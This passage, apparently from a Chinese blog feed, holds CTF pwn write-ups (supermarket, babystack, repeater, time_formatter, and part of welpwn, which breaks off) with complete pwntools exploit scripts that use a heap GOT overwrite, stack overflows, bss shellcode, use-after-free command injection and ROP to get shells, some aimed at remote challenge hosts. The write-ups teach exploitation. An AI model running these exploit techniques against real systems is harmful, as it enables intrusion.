<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"description:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">au_re__read_0</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>name_index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>name_index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果通过修改使得1_des指针指向空间的是一个商品结构体，那么对于1_des的修改就相当于对该商品结构体的修改。流程如下：</p><ol><li>创建node0，</li><li>创建node1，</li><li>增加node0-&gt;size</li><li>创建node2，使得node2申请到的堆空间开始位置是node0-&gt;des指向的那片空间开始位置</li><li>修改node0-&gt;des，同时也就是在修改node2结构体，构造payload使得node2-&gt;des==atoi_got</li><li>跟进atoi的地址计算system函数的地址</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>file_path <span class="token operator">=</span> <span class="token string">'./supermarket'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>atoi_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>remote_ip <span class="token operator">=</span> <span class="token string">'61.147.171.105'</span>port <span class="token operator">=</span> <span class="token number">62162</span>sign <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> sign <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span>remote_ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> price<span class="token punctuation">,</span> des_size<span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'price:'</span><span class="token punctuation">,</span> price<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'descrip_size:'</span><span class="token punctuation">,</span> des_size<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'description:'</span><span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change_des</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> des_size<span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>>'</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'descrip_size:'</span><span class="token punctuation">,</span> des_size<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'description:'</span><span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">del_com</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">b'0'</span><span class="token punctuation">,</span> <span class="token string">b'10'</span><span class="token punctuation">,</span> <span class="token string">b'128'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span>   <span class="token comment">#创建node0</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">,</span> <span class="token string">b'10'</span><span class="token punctuation">,</span> <span class="token string">b'32'</span><span class="token punctuation">,</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span>   <span class="token comment">#创建node1</span>change_des<span class="token punctuation">(</span><span class="token string">b'0'</span><span class="token punctuation">,</span> <span class="token string">b'144'</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">)</span>        <span class="token comment">#修改node0的des_size为144, 扩展node0的des_size，但是没有返回扩展后的指针</span>add<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">,</span> <span class="token string">b'10'</span><span class="token punctuation">,</span> <span class="token string">b'32'</span><span class="token punctuation">,</span> <span class="token string">b'd'</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span>   <span class="token comment">#创建node2,使得node2申请到的空间是node0的des指向空间处开始</span>payload <span class="token operator">=</span> <span class="token string">b'2'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>atoi_got<span class="token punctuation">)</span>  <span class="token comment">#将node2->des==atoi_got</span>change_des<span class="token punctuation">(</span><span class="token string">b'0'</span><span class="token punctuation">,</span> <span class="token string">b'128'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>   <span class="token comment">#现在修改node0->des的值就是在修改node2这个结构体</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'2: price.20, des.'</span><span class="token punctuation">)</span>atoi_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># libc = LibcSearcher('atoi', atoi_addr)</span>libc_base <span class="token operator">=</span> atoi_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>change_des<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">,</span> <span class="token string">b'32'</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#这时候node2->des是指向atoi的地址的，对des的修改相当于对atoi的修改</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'your choice>>'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bjdctf_2020_babystack</title>
      <link href="/ctf-pwn/9ad083a1.html"/>
      <url>/ctf-pwn/9ad083a1.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>打开于2023年10月7日:point_up_2:</p><p>入门栈溢出</p></blockquote><p>checksec检查附件, 没有开启什么保护.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20231007185500.png" alt="checksec" style="zoom:80%;" /><br>用IDA查看发现有<code>read</code>函数有<code>system</code>函数<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20231007190123.png" alt="漏洞函数" style="zoom:80%;" /><br>在主函数中定义了变量<code>nbytes</code>, 通过<code>scanf</code>来对<code>nbytes</code>赋值, 在<code>read</code>函数中向<code>buf</code>写入的长度由<code>nbytes</code>来决定. 先写入一个大的<code>nbytes</code>值, 然后利用<code>read</code>函数造成溢出, 跳转到<code>backdoor</code>函数.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20231007190402.png" alt="main函数" style="zoom:80%;" /><br>完整exp如下所示:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># sh = process('./bjdctf_2020_babystack')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27358</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4006E6</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'[+]Please input the length of your name:'</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"What's u name?\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> stackoverflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-repeater</title>
      <link href="/ctf-pwn/127a001c.html"/>
      <url>/ctf-pwn/127a001c.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>本题目打开于2023年9月19日10:20<br>完成于2023年9月19日16:06<br>bss段写入shellcode</p></blockquote><p>用<code>checksec</code>查看题目, 发现开启了<code>PIE</code>(地址随机化). 开启地址随机化后, 程序每次运行时的地址都会发生变化.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230919160748.png" alt="checksec"><br>用IDA打开查看, 函数<code>sub_982</code>往<code>byte_202040</code>写入数据, 且<code>byte_202040</code>是在<code>bss</code>段中.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230919161102.png" alt="向bss段写入"><br>在接下来的<code>for</code>循环中, 有一个输入<code>s</code>, 还有一个判断语句, 如果条件成立, 会将<code>main</code>函数的地址打印, 这里存在地址泄漏. 通过观察程序可知, <code>v5 == 0x321321</code>即可泄漏地址, 在栈中<code>s</code>和<code>v5</code>是相邻的, 有<code>s</code>的大小是32, 而<code>read</code>函数读取输入的大小是64, 造成栈溢出. 因此, 整体的exp可以分为三步, 第一步向<code>bss</code>段处的<code>byte_202040</code>写入<code>shellcode</code>, 之后通过栈溢出泄漏出<code>main</code>的运行时地址, 计算出该程序运行时加载的基地址, 然后通过相对偏移计算出写入<code>shellcode</code>的地址, 然后利用栈溢出覆盖返回地址<code>getshell</code>.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230919161259.png" alt="地址泄漏"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./repeater'</span><span class="token punctuation">)</span>main_addr_offset <span class="token operator">=</span> <span class="token number">0xA33</span>   <span class="token comment">#main的相对偏移</span><span class="token comment"># sh = process('./repeater')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span> <span class="token number">51293</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Please give me your name :"</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span> <span class="token comment">#向bss段写入shellcode</span>shellcode_addr <span class="token operator">=</span> <span class="token number">0x202040</span>  <span class="token comment">#shellcode的相对偏移地址</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x321321</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input :'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'you :\n0x'</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment">#泄漏main地址</span>base_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_addr_offset <span class="token comment">#计算加载基地址</span>shellcode <span class="token operator">=</span> base_addr <span class="token operator">+</span> shellcode_addr <span class="token comment">#计算shellcode实际地址</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] main addr is :"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] base addr is :"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>base_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] shellcode addr is :"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>  <span class="token comment">#构造溢出, 返回地址为shellcode的地址</span>sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input :'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>strdup函数</title>
      <link href="/misc/5d7e6ffd.html"/>
      <url>/misc/5d7e6ffd.html</url>
      
        <content type="html"><![CDATA[<p><code>strdup</code>函数是对<code>malloc</code>函数的一种封装和扩展, 实现了动态分配内存并复制字符串的功能.<br><code>malloc</code>用于在堆上动态分配内存块, <code>strdup</code>在分配内存的同事, 还将源字符串复制到新分配的内存中, 返回一个指向新字符串的指针.<br><code>strdup</code>:<code>char *strdup(const char *str);</code><br>函数实现:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span> <span class="token function">__strdup</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token class-name">size_t</span> len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>new <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>new <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">memecpy</span><span class="token punctuation">(</span>new<span class="token punctuation">,</span>s<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> C函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-time_formatter</title>
      <link href="/ctf-pwn/4ae9b482.html"/>
      <url>/ctf-pwn/4ae9b482.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>打开于2023年9月13日10:17:58<br>完成于2023年9月14日22:04:40<br>第一次接触到堆题<br>UAF漏洞</p></blockquote><p>先checksec检查一下, 64位程序, 保护基本都开了.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914211140.png" alt="checksec" style="zoom:80%;" /><br>运行程序如下, 有输入输出.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914211238.png" alt="time_formatter" style="zoom:80%;" /><br>用IDA打开看一下主函数如下:<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914211411.png" alt="main" style="zoom: 50%;" /><br>慢慢看吧, 先看<code>set_format</code>函数, 跟进<code>return_malloc_ptr</code>函数,在这里利用<code>fgets</code>来读取输入, 再跟进<code>sub_400C26</code>函数. 可以看到在<code>400C26</code>中使用到了<code>strudp</code>(<a href="http://blog.yangsx.cn/misc/5d7e6ffd.html">strdup函数 | 小哑师兄</a>)函数来进行字符串复制. 由于<code>strdup</code>的是通过<code>malloc</code>函数来实现的, 这里相当于申请了一块堆空间.<code>400C26</code>函数返回了该内存空间的指针给函数<code>return_malloc_ptr</code>, 然后又返回给<code>set_format</code>函数.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914211536.png" alt="set_format" style="zoom:80%;" /><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914211618.png" alt="return_malloc_ptr" style="zoom:80%;" /><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914211745.png" alt="sub_400C26" style="zoom:80%;" /><br>在<code>set_format</code>函数收到返回来的函数指针后,在<code>sub_400CB5</code>中先进行了一个简单的字符串检查(划重点, 后面会提到), 如果检查通过, 则会将在之前申请到的内存空间指针赋值给<code>ptr</code>(<code>ptr</code>为全局变量).<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914212911.png" alt="sub_400CB5" style="zoom:80%;" /><br><code>set_time</code>函数逻辑很清晰, 里面也没有啥需要关注的点<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914213208.png" alt="set_time" style="zoom:80%;" /><br>在<code>set_zone</code>函数中, 也是用<code>return_malloc_ptr</code>函数来返回了一个函数指针并赋值给了<code>value</code>(全局变量)<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914213408.png" alt="image.png" style="zoom:80%;" /><br><code>print_time</code>函数中, 用<code>snprintf_chk</code>函数将要执行的命令写入<code>command</code>中然后由<code>system</code>函数来执行. 在<code>snprintf_chk</code>中, 将<code>ptr</code>所指的值通过格式化字符串<code>%s</code>来赋值.<br><code>system</code>在执行<code>command</code>命令时, 也就是执行<code>system(&quot;/bin/data -d @&lt;number&gt; + ptr&quot;)</code>, 在这里只要将<code>ptr</code>指向的字符串构造为<code>&#39;;command;&#39;</code>即可执行.(Bypass命令注入, 利用<code>&#39;</code>闭合命令来执行新的命令).<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914213620.png" alt="print_time" style="zoom:80%;" /><br>在<code>exit_process</code>函数中, 先去释放<code>ptr</code>和<code>value</code>, 然后让用户来决定是否退出. 这里释放指针后并没有让其指向<code>NULL</code>, 存在<code>UAF</code>漏洞.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914214000.png" alt="image.png" style="zoom:80%;" /><br>到这里思路就比较清晰了, 要想<code>getshell</code>, 就要利用<code>print_time</code>函数中的<code>system</code>函数来执行命令, 而命令的写入是依靠<code>ptr</code>所指向的字符串. 在<code>set_format</code>函数中有检测, 无法写入<code>;</code>和<code>&#39;</code>, 在<code>set_zone</code>函数中可以写入任意函数. 因为在<code>exit_process</code>函数中释放空间后, 并没让<code>ptr</code>指空, 这时候造成指针悬挂, 如果这时候调用<code>set_zone</code>函数来给<code>value</code>申请内存, 则<code>ptr</code>和<code>value</code>会指向同一内存空间.<br>综上可以通过<code>1, 5, 3, 4</code>的执行顺序来<code>getshell</code>.<br>完整exp如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./time_formatter'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./time_formatter'</span><span class="token punctuation">)</span><span class="token comment"># sh = remote('61.147.171.105', 65452</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">b"1"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Format: "</span><span class="token punctuation">,</span><span class="token string">b"A"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">"5"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Are you sure you want to exit (y/N)? "</span><span class="token punctuation">,</span><span class="token string">b'N'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">b"3"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Time zone: "</span><span class="token punctuation">,</span><span class="token string">b"';/bin/sh;'"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">b"4"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Heap </tag>
            
            <tag> UAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-welpwn</title>
      <link href="/ctf-pwn/eabc8e5d.html"/>
      <url>/ctf-pwn/eabc8e5d.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>打开于2023年9月11日13:39:59<br>完成于2023年9月12日23:30:32<br>这道题目很巧妙</p></blockquote><p>checksec检查, 没有开启什么保护<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230908111328.png" alt="checksec检查" style="zoom:80%;" /><br>首先来看主函数, 用<code>read</code>函数来做一个输入, <code>buf</code>的大小为<code>1024</code>, <code>read</code>也是输入<code>1024</code>, 这里没有可利用的点存在.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912215223.png" alt="main函数" style="zoom:80%;" /><br>跟进<code>echo</code>函数看一下, 在该函数中会将<code>buf</code>复制到<code>s2</code>中, <code>s2</code>的大小是16. 复制过程通过<code>for</code>循环来完成. <code>for</code>循环的结束条件是<code>*(_BYTE *)(i + a1) == 0</code>.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912215533.png" alt="echo函数" style="zoom:80%;" /><br>程序的漏洞点就在<code>echo</code>函数中, 因为将<code>buf</code>复制给<code>s2</code>的过程中可以造成溢出. 通过此处的溢出来完成一系列操作.<br>首先, 因为程序中并没有可以利用的<code>system</code>等, 所以需要通过<code>write</code>或<code>puts</code>来泄漏libc地址<br>其次, 由于<code>for</code>循环的结束条件限制, 构造的payload会被截断. 因为<code>p64</code>地址中存在<code>00</code>填充字符. 如果直接构造<code>payload = b&#39;a&#39; * 16 + b&#39;a&#39; * 8</code> 这样来覆盖<code>echo</code>的返回地址, 并不会成功, 之后保留第一个执行地址, 后面的都会被断掉.<br>在调试过程中发现<code>s2</code>和<code>buf</code>在栈中相距<code>0x20</code>即32, 而且他们之间隔着的是<code>echo rbp</code>和<code>echo ret</code>. 在这里可以利用<code>pop|ret</code>来绕过复制过程中的截断.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912224732.png" alt="buf与echo的栈关系" style="zoom:80%;" /><br>如下图所示, 首先<code>s2</code>的大小是16, 现在构造这样的<code>payload = buf = b&#39;a&#39; * 24 + pop_4_ret + pop_rdi + write_got + puts_plt + main_addr</code>, 那么在复制过程中会在会将<code>pop_4_ret</code>之前的(包括<code>pop</code>)复制到s2的栈中, 会将<code>echo rbp</code>, <code>echo ret</code>给覆盖掉, <code>echo ret</code>变成了<code>pop_4_ret</code>, <code>echo</code>在返回时执行<code>pop_4_ret</code>, 通过四次<code>pop</code>操作, 将栈中接下来的<code>a * 24 + pop_4_ret</code>(图中红色部分)出栈, 然后跳转开始执行<code>pop_rdi</code>这部分<code>payload</code>, 